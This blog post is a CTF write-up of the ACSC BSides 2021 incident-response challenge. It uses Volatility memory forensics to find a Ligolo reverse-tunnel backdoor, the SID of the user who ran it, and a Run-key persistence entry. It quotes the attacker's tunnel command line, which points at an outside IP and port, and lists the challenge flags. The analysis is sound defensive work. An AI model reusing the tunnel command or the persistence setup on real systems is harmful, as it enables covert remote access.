---
layout: post
title: ACSC BSides IR Challenge 2021 - 08 - Alternate Persistence
author: shanna
categories: CTF
image: assets/images/CTF.png
tags: ACSC-Challenge-2021
toc: true
---
#### Post series
In April 2021 the ACSC hosted an IR challenge at BSides Canberra. I am writing up a blog post for each of the different sections of the challenge including the tools set up. The complete listing of all the parts I've written up:

<ol class="font-weight-light">
    {% for post in site.tags.ACSC-Challenge-2021 reversed %}
    <li class="mb-2">
        <span>
            <h6 class="font-weight-normal">
                <a href="{{site.baseurl}}{{ post.url }}" class="text-dark">{{ post.title }}</a>
            </h6>
        </span>
    </li>
    {% endfor %}
</ol>

The challenge can be downloaded <a href="https://www.cyber.gov.au/acsc/view-all-content/news/acsc-cyber-security-challenge">here</a> along with all the details you need to get going. 
<p>-----</p>

## Alternate Persistence
> If things weren't bad enough, ALIEN have identified odd connections originating on the network. Seems that the actor has still a few tricks to retain access...

For this bit we are moving away from disk artefacts and we use the memory image that has been provided under `workstation1.alien.local-memory`. Wanted to run through each question and do in both Nexus and in Volatility to see the differences (where possible and where I knew where to look). I find memory forensics really fun and its a great way to see what malware is doing once it is unpacked in memory.

**Note: See <a href="{{ site.baseurl }}/ACSC-BSides-IR-Challenge-2021-Setup/" target="_blank">this page </a>for tool set up and explanations.**

### AP-1
<h5>There have been some odd connections out to the malicious IP from the actor’s new target. What ip and port is the actor using? Flag format: IP:PORT</h5>

Our actor IP address we know about is 13.54.35.87. I actually flagged this in the Initial Access write up while using Trufflepig Nexus. This was really easy to find.

1. From the left hand menu choose "NetworkConnection".
2. Click on the search icon.
3. Add a field for Remote Address equals 13.54.35.87.

   ![Network connections in trufflepig Nexus]({{site.baseurl}}/assets/images/posts/AP-1.png)

<h5>Flag: 13.54.35.87:5555</h5>

Did this in volatility too
```
.local/bin/vol -f "/mnt/f/ACSC/ACSC_IR_Challenge_2021/artefacts/workstation1.alien.local-memory/memory.raw" netscan
```
Reviewing the output and we see this line:
```
0xac81949e9930  TCPv4   10.1.1.182      52763   13.54.35.87     5555    ESTABLISHED     32      PSclient.exe    2021-04-06 01:02:26.000000
```

### AP-2
<h5>Where is the binary associated with this malicious network connection, which we will call sample 4, executed from? Flag Format: c:\a\file\path</h5>

1. Select Process from the menu on the left.
2. Search for command line containing "5555".

```
Process:	32 | PSclient.exe
Parent Process:	4076 | wsmprovhost.exe
Name:	PSclient.exe
Command Line:	"C:/Users/Public/PSclient.exe" -autorestart -relayserver 13.54.35.87:5555
PID:	32
PPID:	4076
Start Time:	2021-04-06T01:02:26.568Z
```

<h5>Flag: C:/Users/Public/PSclient.exe</h5>

In volatility:
```
.local/bin/vol -f "/mnt/f/ACSC/ACSC_IR_Challenge_2021/artefacts/workstation1.alien.local-memory/memory.raw" cmdline --pid 32
```
for this output
```
32      PSclient.exe    "C:\Users\Public\PSclient.exe" -autorestart -relayserver 13.54.35.87:5555
```

### AP-3
<h5>What user executed sample 4? Flag Format: Full SID</h5>
From above we can see the process ID is 32. I couldn't immediately find the SID or how to enumerate this in Nexus, so I went to Volatility. There is a plugin called <a target="_blank" href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#getsids">'GetSIDs'</a> that allows you to view the SIDs (Security Identifiers) associated with a process and identify the user associated.

```
.local/bin/vol -f "/mnt/f/ACSC/ACSC_IR_Challenge_2021/artefacts/workstation1.alien.local-memory/memory.raw" getsids --pid 32

Volatility 3 Framework 2.0.1
Progress:  100.00               PDB scanning finished
PID     Process SID     Name

32      PSclient.exe    S-1-5-21-3316040739-64797688-1164660000-1111    admin
32      PSclient.exe    S-1-5-21-3316040739-64797688-1164660000-513     Domain Users
32      PSclient.exe    S-1-1-0 Everyone
32      PSclient.exe    S-1-5-32-544    Administrators
32      PSclient.exe    S-1-5-32-545    Users
32      PSclient.exe    S-1-5-2 Network
32      PSclient.exe    S-1-5-11        Authenticated Users
32      PSclient.exe    S-1-5-15        This Organization
32      PSclient.exe    S-1-5-21-3316040739-64797688-1164660000-512     Domain Admins
32      PSclient.exe    S-1-18-1        Authentication Authority Asserted Identity
32      PSclient.exe    S-1-5-21-3316040739-64797688-1164660000-572     -
32      PSclient.exe    S-1-16-12288    High Mandatory Level
```

<h5>Flag: S-1-5-21-3316040739-64797688-1164660000-1111</h5>

### AP-4
<h5>Looking at the malicious process, what language sample 4 written in? Flag Format: Language</h5>

I'm going to dump the process memory into a file:
```
.local/bin/vol -f "/mnt/f/ACSC/ACSC_IR_Challenge_2021/artefacts/workstation1.alien.local-memory/memory.raw" windows.pslist.PsList --pid 32 --dump
Volatility 3 Framework 2.0.1
Progress:  100.00               PDB scanning finished
PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output
32      4076    PSclient.exe    0xac81958dd080  5       -       0       False   2021-04-06 01:02:26.000000      N/A     pid.32.0xbc0000.dmp
```
ran strings and had a look and saw lots of references to GO.

```
strings pid.32.0xbc0000.dmp > strings.txt
```

<h5>Flag: Golang</h5>

### AP-5
<h5>What is the common, open source name for sample 4? Flag Format: Toolname</h5>
Browsing through strings i saw:
```
path    ligolo/cmd/ligolo
mod     ligolo  (devel)
dep     github.com/armon/go-socks5      v0.0.0-20160902184237-e75332964ef5      h1:0CwZNZbxp69SHPdPJAN/hZIm0C4OItdklCFmMRWYpio=
dep     github.com/hashicorp/yamux      v0.0.0-20190923154419-df201c70410d      h1:W+SIwDdl3+jXWeidYySAgzytE3piq6GumXeBjFBG67c=
dep     github.com/konsorten/go-windows-terminal-sequences      v1.0.1  h1:mweAR1A6xJ3oS2pRaGiHgQ4OO8tzTaLawm8vnODuwDk=
dep     github.com/sirupsen/logrus      v1.4.2  h1:SPIRibHv4MatM3XXNO2BJeFLZwZ2LvZgfQ5+UNI2im4=
dep     golang.org/x/net        v0.0.0-20200202094626-16171245cfb2      h1:CCH4IOTTfewWjGOlSp+zGcjutRKlBEZQ6wTn8ozI/nI=
```
<a target="_blank" href="https://github.com/sysdream/ligolo">Ligolo</a> is a reverse tunneling tool written in Go.

<h5>Flag: ligolo</h5>

### AP-6
<h5>The actor has worked out a way to maintain persistence even after reboot. What is the key name of this persistence entry? Flag Format: Name</h5>
There are many ways for an actor to maintain <a target="_blank" href="https://attack.mitre.org/tactics/TA0003/">persistence</a> after a reboot, some of the more obvious ones are in registry keys - T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder. From this site we can see where to start looking, so ill focus on this key "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run".

With volatility run the following command:
```
.local/bin/vol -f "/mnt/f/ACSC/ACSC_IR_Challenge_2021/artefacts/workstation1.alien.local-memory/memory.raw" hivelist
```
Which will give the output and we can get the offset of the SOFTWARE hive.
```
Volatility 3 Framework 2.0.1
Progress:  100.00               PDB scanning finished
Offset  FileFullPath    File output

0xd40ca4810000          Disabled
0xd40ca484c000  \REGISTRY\MACHINE\SYSTEM        Disabled
0xd40ca48d8000  \REGISTRY\MACHINE\HARDWARE      Disabled
0xd40ca7037000  \Device\HarddiskVolume1\Boot\BCD        Disabled
0xd40ca703d000  \SystemRoot\System32\Config\SOFTWARE    Disabled
0xd40ca8269000  \SystemRoot\System32\Config\DEFAULT     Disabled
0xd40ca8341000  \SystemRoot\System32\Config\SECURITY    Disabled
0xd40ca8413000  \SystemRoot\System32\Config\SAM Disabled
0xd40ca845b000  \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT        Disabled
0xd40ca85c3000  \SystemRoot\System32\Config\BBI Disabled
0xd40ca8621000  \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT  Disabled
0xd40ca9bef000  \??\C:\Users\dadmin\ntuser.dat  Disabled
0xd40ca9ea9000  \??\C:\Users\dadmin\AppData\Local\Microsoft\Windows\UsrClass.dat        Disabled
0xd40ca9e03000  \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.Windows.ShellExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy\ActivationStore.dat        Disabled
0xd40caaaac000  \??\C:\Users\dadmin\AppData\Local\Packages\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy\Settings\settings.dat    Disabled
0xd40caab55000  \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.Windows.Cortana_1.11.6.17763_neutral_neutral_cw5n1h2txyewy\ActivationStore.dat    Disabled
0xd40caab52000  \??\C:\Users\dadmin\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\Settings\settings.dat        Disabled
0xd40caeea4000  \??\C:\Users\admin\ntuser.dat   Disabled
0xd40cae6f5000  \??\C:\Users\admin\AppData\Local\Microsoft\Windows\UsrClass.dat Disabled
0xd40cae3f7000  \SystemRoot\System32\config\DRIVERS     Disabled
```
So our next volatility command looks like:
```
.local/bin/vol -f "/mnt/f/ACSC/ACSC_IR_Challenge_2021/artefacts/workstation1.alien.local-memory/memory.raw" printkey --offset 0xd40ca703d000 --key "Microsoft\Windows\CurrentVersion\Run"
```
with the following output:
```
Volatility 3 Framework 2.0.1
Progress:  100.00               PDB scanning finished
Last Write Time Hive Offset     Type    Key     Name    Data    Volatile

2021-04-06 01:01:27.000000      0xd40ca703d000  REG_EXPAND_SZ   \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows\CurrentVersion\Run       SecurityHealth  "%windir%\system32\SecurityHealthSystray.exe"   False
2021-04-06 01:01:27.000000      0xd40ca703d000  REG_SZ  \SystemRoot\System32\Config\SOFTWARE\Microsoft\Windows\CurrentVersion\Run       StartVPN        "C:\Users\Public\PSclient.exe -autorestart -relayserver 13.54.35.87:5555"        False
```

We can see within that out put the key value that matches our backdoor cmdline. The key name is StartVPN.

<h5>Flag: StartVPN</h5>